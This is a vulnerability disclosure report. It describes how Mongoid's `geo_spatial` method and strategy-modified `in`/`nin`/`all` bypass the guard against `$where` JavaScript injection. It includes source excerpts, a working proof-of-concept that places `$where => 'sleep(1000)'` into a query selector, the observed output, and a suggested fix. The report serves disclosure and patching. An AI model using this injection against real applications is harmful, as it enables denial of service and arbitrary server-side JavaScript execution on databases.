# Mongoid: `geo_spatial` / strategy-modified `in`/`nin`/`all` bypass the `$where`/NoSQL-injection query-operator guard

## Summary

Mongoid's `Criteria#geo_spatial` and the `.override`/`.union`/`.intersect` strategy
modifiers (when chained before `.in`/`.nin`/`.all`) write field/value pairs directly
into the query selector via `Mergeable#__merge__` / `Mergeable#with_strategy`,
bypassing `_mongoid_expand_keys` entirely — the single choke point that
`Selectable#where`, `#and`, `#or`, `#nor`, `#not`, `#any_of`, `#none_of`, and
`#elem_match` all pass through to reach `_mongoid_validate_operators!`.

This is the exact vulnerability class fixed by MONGOID-5939 / MONGOID-5993 /
MONGOID-5994 (server-side JavaScript / NoSQL-operator injection via `$where`,
`$function`, `$accumulator`), reached through a fourth, unpatched entry point.
An attacker who controls a field name or value passed into `geo_spatial` (or
into `.override`/`.union`/`.intersect(...).in/.nin/.all`) can inject `$where`
directly into the selector Mongoid hands to the MongoDB driver — with **no
exception raised**, even though `Mongoid.allow_unsafe_query_operators?` is
`false` (the current, hardened default as of the very same commit that
introduced this guard).

## Affected version

- Repository: `mongodb/mongoid`
- Branch: `master`
- Commit verified against: `381d954edf3812f138e53b940123126619713a03` (2026-09-17,
  tagged as the 9.1.1 release candidate)
- This is the exact commit range in which the sibling guard
  (`allow_unsafe_query_operators`, `_mongoid_validate_operators!`,
  `_mongoid_validate_no_javascript!`) was introduced/hardened, in
  `91cc55dacfb68339b50628b489626f8319fd21b1` ("Merge commit from fork",
  2026-09-17), addressing MONGOID-5939/5993/5994. This report describes a gap
  in that same hardening pass, not a regression from an older fix.

## Root cause

`Selectable#where` and friends normalize a user-supplied criterion through
`_mongoid_expand_keys`, which (as of `91cc55dac`) calls
`_mongoid_validate_operators!` — this is what rejects a top-level operator not
in `ALLOWED_QUERY_OPERATORS` and recursively rejects `$where`/`$function`/
`$accumulator` at any depth:

`lib/mongoid/criteria/queryable/mergeable.rb`:
```ruby
def _mongoid_expand_keys(criterion)
  # ...
  _mongoid_validate_operators!(result)   # added by 91cc55dac
  result
end
```

`geo_spatial`, however, does not go through this method at all:

`lib/mongoid/criteria/queryable/selectable.rb:209-213`:
```ruby
def geo_spatial(criterion)
  raise Errors::CriteriaArgumentRequired, :geo_spatial if criterion.nil?

  __merge__(criterion)
end
```

`lib/mongoid/criteria/queryable/mergeable.rb:120-124`:
```ruby
def __merge__(criterion)
  selection(criterion) do |selector, field, value|
    selector.merge!(field.__expr_part__(value))
  end
end
```

`selection` (`lib/mongoid/criteria/queryable/selectable.rb:981-990`) simply
stringifies the field name and yields it — no `$`-prefix check, no call to
`_mongoid_expand_keys` or `_mongoid_validate_operators!`:

```ruby
def selection(criterion = nil)
  clone.tap do |query|
    if criterion
      criterion.each_pair do |field, value|
        yield(query.selector, field.is_a?(Key) ? field : field.to_s, value)
      end
    end
    query.reset_strategies!
  end
end
```

`String#__expr_part__` (`lib/mongoid/criteria/queryable/extensions/string.rb:79-84`)
is a plain echo for the non-negating case:

```ruby
def __expr_part__(key, value, negating = false)
  if negating
    { key => { "$#{__regexp?(value) ? 'not' : 'ne'}" => value } }
  else
    { key => value }
  end
end
```

So `geo_spatial('$where' => 'sleep(1000)')` merges `{"$where" => "sleep(1000)"}`
verbatim into `selector`, with none of the three guard layers ever consulted.

A second, related bypass exists via the `.override`/`.union`/`.intersect`
strategy modifiers used before `.in`/`.nin`/`.all`:

`lib/mongoid/criteria/queryable/mergeable.rb:397-404`:
```ruby
def with_strategy(strategy, criterion, operator)
  selection(criterion) do |selector, field, value|
    selector.store(
      field,
      selector[field].send(strategy, prepare(field, operator, value))
    )
  end
end
```

This also routes through the unguarded `selection` helper rather than
`_mongoid_expand_keys`, and — separately from `_mongoid_validate_operators!` —
also skips `Storable#add_field_expression`'s own `$`-prefix rejection (that
check only fires on the plain, non-strategy branch of `in`/`nin`/`all`).

## Proof of Concept

Reproduced live against the cloned repository at the commit above (Ruby 3.3.6,
Mongoid loaded via `bundle`, no MongoDB server connection required — the
selector is built entirely in Ruby before ever reaching the driver):

```ruby
require 'mongoid'

Mongoid.configure do |config|
  config.clients.default = { uri: 'mongodb://127.0.0.1:27017/verify_test' }
end

class Person
  include Mongoid::Document
  field :name, type: String
end

Mongoid.allow_unsafe_query_operators?   # => false  (hardened default)

# Normal path: guard works as intended.
Person.where('$where' => 'sleep(1000)')
# => raises Mongoid::Errors::InvalidQuery:
#    "Operator '$where' is not allowed in a query expression. ..."

# geo_spatial: guard is bypassed entirely.
Person.geo_spatial('$where' => 'sleep(1000)').selector
# => {"$where"=>"sleep(1000)"}      <-- no exception; raw $where reaches selector

# override + in: guard is bypassed too (weaker exploitability, see Impact).
Person.all.override.in('$where' => 'sleep(1000)').selector
# => {"$where"=>{"$in"=>["sleep(1000)"]}}
```

Output actually observed when running this script:
```
allow_unsafe_query_operators? = false
OK: .where raises as expected: Operator '$where' is not allowed in a query expression. Set Mongoid.allow_unsafe
geo_spatial selector = {"$where"=>"sleep(1000)"}
CONFIRMED: geo_spatial bypasses the operator/JS guard entirely
override.in selector = {"$where"=>{"$in"=>["sleep(1000)"]}}
```

`Mongoid::Contextual::Mongo` passes `criteria.selector` straight to the driver
(`lib/mongoid/contextual/mongo.rb`, `collection.find(criteria.selector, ...)`),
so `Person.geo_spatial('$where' => 'sleep(1000)').first` issues exactly
`db.people.find({"$where": "sleep(1000)"})` to the MongoDB server — full
server-side JavaScript execution, unconditionally.

## Impact

`$where` executes arbitrary JavaScript inside the `mongod` server process for
every document scanned. Concretely reachable impact:

- **Denial of service**: a pattern like `sleep(N)`/an infinite loop blocks the
  scanning thread for the query's duration, and is trivially repeatable.
- **NoSQL/logic injection**: an attacker who can influence the *value* half of
  a `geo_spatial` call (even with a fixed, safe field name) can smuggle a
  `$where` **key** if the call site builds its criterion hash dynamically from
  request data (e.g. `Model.geo_spatial(params[:field] => params[:value])`, or
  any helper that forwards a user-supplied hash into `geo_spatial` — a
  realistic pattern for apps exposing geo/location search).
- Consistent with how MongoDB itself documents `$where`, the executed
  JavaScript runs with the server's own privileges inside the query engine,
  which is exactly the risk class MONGOID-5939/5993/5994 were written to close
  for every other query entry point.

Severity is comparable to the already-patched siblings: this is not a
theoretical gap — it is the *same* `$where` string, injected through the
*same* selector, reaching the *same* driver call, just via a path the
otherwise-thorough 91cc55dac hardening pass did not route through the new
guard.

## Suggested fix

Route both `Mergeable#__merge__` (used by `geo_spatial`) and
`Mergeable#with_strategy` (used by `.override`/`.union`/`.intersect` +
`.in`/`.nin`/`.all`) through `_mongoid_expand_keys`/`_mongoid_validate_operators!`
before merging into the selector — or, more narrowly, call
`_mongoid_validate_operators!` directly on the criterion hash at the top of
`geo_spatial` and `with_strategy`, matching the check already centralized in
`_mongoid_expand_keys` for every other selector-building path.

## Disclosure notes

This finding was produced via source review and local reproduction only (no
network access to any MongoDB service, no attempt to reach any hosted/production
system). It directly extends the fix scope of MONGOID-5939/5993/5994 in commit
`91cc55dacfb68339b50628b489626f8319fd21b1`.
